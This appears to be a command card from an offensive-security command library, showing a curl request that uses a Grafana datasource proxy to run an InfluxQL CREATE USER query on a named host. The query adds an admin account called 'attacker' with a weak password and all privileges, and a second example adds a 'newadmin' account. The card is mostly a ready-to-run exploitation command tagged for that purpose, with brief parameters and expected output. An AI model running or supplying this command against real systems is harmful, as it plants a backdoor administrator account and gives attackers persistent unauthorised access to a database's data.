---
data: >-
  curl -G "http://velodrome.k8s.io/api/datasources/proxy/4/query"
  --data-urlencode "db=metrics" --data-urlencode "q=CREATE USER \"attacker\"
  WITH PASSWORD 'weakpass' WITH ALL PRIVILEGES"
tags:
  - influxql
  - exploitation
  - user-creation
type: command
output: null
executor: bash
platforms:
  - Web
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T17:28:51.888Z'
id: 246f8ea2-59d7-46c2-bee6-c4fcb81649f8
verified: false
validated: true
submitted: true
---
# influxdb-create-admin-user

## Command

```bash
curl -G "http://velodrome.k8s.io/api/datasources/proxy/4/query" \
  --data-urlencode "db=metrics" \
  --data-urlencode "q=CREATE USER \"attacker\" WITH PASSWORD 'weakpass' WITH ALL PRIVILEGES"
```

## Description

This command uses the Grafana proxy to execute an InfluxQL CREATE USER statement, adding a new admin user to InfluxDB. Requires prior admin access via the proxy.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `--data-urlencode db=metrics` | Proxy context database | Yes |
| `--data-urlencode q=...` | CREATE USER query with username, password, and privileges | Yes |

## Examples

### Basic Usage

```bash
curl -G "http://velodrome.k8s.io/api/datasources/proxy/4/query" --data-urlencode "db=metrics" --data-urlencode "q=CREATE USER \"newadmin\" WITH PASSWORD 'securepass' WITH ALL PRIVILEGES"
```

### Advanced Usage

Customize username/password.

## Expected Output

Empty JSON response on success {"results":[{"error":""}]}, or error if permissions insufficient.

## Related

- [[commands/influxdb-show-databases]]
